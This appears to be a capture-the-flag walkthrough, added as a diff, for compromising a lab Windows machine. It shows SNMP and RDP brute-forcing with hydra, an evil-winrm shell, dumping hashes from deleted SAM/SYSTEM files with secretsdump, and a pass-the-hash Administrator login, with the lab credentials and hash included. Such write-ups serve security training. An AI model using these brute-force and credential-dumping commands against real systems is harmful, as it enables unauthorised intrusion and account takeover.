@@ -1,0 +1,64 @@
+ip : 10.10.242.5
+
+- started nmap scan and found a few ports 
+- started enumeration on the ports and didnt find any useful information
+- scanning for UDP ports using nmap
+	nmap -sU -top-ports 10.10.242.5
+	
+- found a few more ports among which the snmp port (161) stands out  
+- using snmp-check tool to enumerate the snmp but was of no help to us
+	snmp-check 10.10.242.5 -c public
+
+- brute forcing the snmp port with seclists wordlists for snmp
+	hydra -P common-snmp-community-strings-onesixtyone.txt 10.10.242.5 snmp
+	
+- we got a hit 
+
+creds : openview
+
+- trying the password with snmp-check gives us a lot of informations including usernames 
+	snmp-check 10.10.242.5 -c openview
+	
+- user accounts
+	  Guest               
+	  Jareth              
+	  Administrator       
+	  DefaultAccount      
+	  WDAGUtilityAccount 
+	  
+- since we have the rdp port open and have usernames , lets try brute forcing rdp with hydra
+	hydra -l Jareth -P /usr/share/wordlists/rockyou.txt 10.10.242.5 rdp
+	
+- we got the password
+
+creds : Jareth : sarah
+
+- trying it with crackmapexec to check if its valid
+	crackmapexec smb 10.10.242.5 -u "Jareth" -p "sarah" --shares
+
+- we are able to list shares with the credentials
+- trying to get a shell with evil-winrm and succeeded
+	evil-winrm -i 10.10.242.5 -u Jareth -p 'sarah'
+
+- get the flag 
+
+Priv-Esc
+--------
+- checked user groups and privileges and nothing seems exploitable 
+- running winpeas.bat on the target 
+- there might be files in the recyclebin of the user
+- cd to the recycle bin with the command 
+	cd '$Recycle.bin\S-1-5-21-1987495829-1628902820-919763334-1001'
+	
+- and found deleted sam and system files 
+- downloading the system files into the attacker machine using download option of evil-winrm or using smbserver
+- use secretsdump.py to dump all the hashes from the sam and system files
+	secretsdump.py -sam sam.bak -system system.bak local
+	
+- got the hash for the Administrator user
+- using the hash to login to the machine through evil-winrm
+	evil-winrm -i 10.10.242.5 -u Administrator -H '6bc99ede9edcfecf9662fb0c0ddcfa7a'
+
+- we are Administrator
+- grab the final flag from the Administrator desktop
+	
